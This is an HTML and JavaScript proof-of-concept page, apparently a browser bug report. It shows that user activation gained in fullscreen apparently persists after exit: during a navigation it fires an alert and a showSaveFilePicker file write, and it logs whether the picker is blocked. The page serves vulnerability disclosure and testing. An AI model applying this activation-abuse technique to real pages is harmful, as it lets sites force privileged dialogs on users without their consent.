<!doctype html>
<meta charset="utf-8">
<title>Fullscreen Activation Leak PoC</title>

<style>
body {
  font-family: system-ui, sans-serif;
}
#hint {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  font-size: 24px;
  color: white;
  background: black;
  z-index: 9999;
  user-select: none;
  pointer-events: none;
}
</style>

<button id="start">START (enter fullscreen)</button>
<pre id="status"></pre>

<div id="hint">Click once, then press ESC</div>

<script>
let interactedInFullscreen = false;

const log = m => {
  status.textContent += m + "\n";
  console.log(m);
};

/* enter fullscreen */
start.onclick = async () => {
  log("requestFullscreen()");
  await document.documentElement.requestFullscreen();
};

/* record pointer interaction */
addEventListener("pointerdown", () => {
  if (!document.fullscreenElement) return;
  if (interactedInFullscreen) return;
  interactedInFullscreen = true;
  log("Pointer interaction recorded");
});

/* fullscreen exit */
addEventListener("fullscreenchange", async () => {
  if (document.fullscreenElement) {
    hint.style.display = "flex";
    return;
  }

  hint.style.display = "none";
  log("Exited fullscreen");

  // schedule navigation
  setTimeout(() => {
    log("Navigating to example.com");
    location.href = "https://example.com";
  }, 20);

  if (!interactedInFullscreen) {
    log("No activation → stop");
    return;
  }

  // native dialog during navigation
  setTimeout(() => {
    alert("HELLO");
    log("Alert shown");
  }, 35);

  // privileged API test
  try {
    log("Attempting showSaveFilePicker()");
    const h = await showSaveFilePicker({
      suggestedName: "activation.txt"
    });
    const w = await h.createWritable();
    await w.write("Activation persisted after fullscreen exit.");
    await w.close();
    log("Picker SHOWN");
  } catch (e) {
    log("Picker BLOCKED: " + e.name);
  }
});
</script>
